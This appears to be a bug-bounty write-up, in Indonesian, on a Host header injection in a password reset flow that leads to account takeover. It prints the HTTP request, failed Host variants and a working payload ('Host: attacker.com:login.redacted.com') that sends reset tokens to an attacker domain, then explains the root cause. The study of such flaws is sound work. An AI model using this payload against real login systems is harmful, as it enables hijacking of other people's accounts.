# Host header → ATO via reset password

* Target pakai flow:
  `POST /reset-credentials`
* Link reset dibangun pakai **Host header**
* Manipulasi Host dipakai buat **inject domain attacker**



## 🔥 Percobaan penting

1. **Normal request**

```http
POST /auth/realms/Redacted/login-actions/reset-credentials?session_code=AbcdiQqKwDBsJcdIjZpAFW3&client_id=account&tab_id=Abcdii7y9i3qwXs HTTP/1.1
Host: login.redacted.com
Cookie: AUTH_SESSION_ID=fc59cdd34026abcd; KC_RESTART=AbcdiSldUIiiaXNFs
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: https://login.redcated.com
Referer: https://login.redacted.com/auth/realms/redacted/login-actions/reset-credentials?client_id=account&tab_id=Abcdi3qwXs
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

username=testemail%40gmail.com
```

2. **Subdomain injection gagal**

```
Host: login.redacted.com.burpcollaborator.com
```

→ dianggap invalid / tidak dipakai

3. **Reverse placement**

Setelah beberapa kali mencoba, saya menemukan bahwa menambahkan apa pun di header Host tidak akan berfungsi jika tidak diakhiri dengan “login.company.com”. Seperti yang telah Anda lihat sebelumnya, saya telah melampirkan URL Burp Collaborate saya di bagian akhir, tetapi tetap tidak berhasil.

Jadi sekarang saya mencoba menggunakan tautan Burp Collaborator di awal Host: 

```
Host: burpcollaborator.com.login.redacted.com
```

Saat mencoba ini, saya mendapatkan tautan lupa kata sandi di email saya dan tampilannya seperti ini: 

```bash
https://abc.burpcollaborator.login.redacted.com/auth/realms/login-actions/action-token  ?key=ey.... 
```



## 💥 Kenapa sempat gagal pingback

* Server **sanitize / normalize Host**
* Menghapus atau memotong bagian tidak valid
* Atau hanya menerima suffix tertentu (`*.redacted.com`)



## ⚠️ Breakthrough logic

Payload yang berhasil:

```
Host: attacker.com:login.redacted.com
```

➡️ server parse Host secara **aneh (parser split tidak standar)**
➡️ bagian sebelum `:` dipakai untuk generate URL
➡️ bagian belakang tetap dianggap valid domain



## 🚨 Impact utama

* Password reset link diarahkan ke domain attacker
* Token reset ikut terkirim ke collaborator
* Full **Account Takeover (ATO)**



## 🧩 Root cause

* Host header dipakai langsung untuk:

  * generate absolute URL
  * email link reset password
* Tidak ada strict validation / canonicalization
* Parser HTTP server beda dengan aplikasi logic

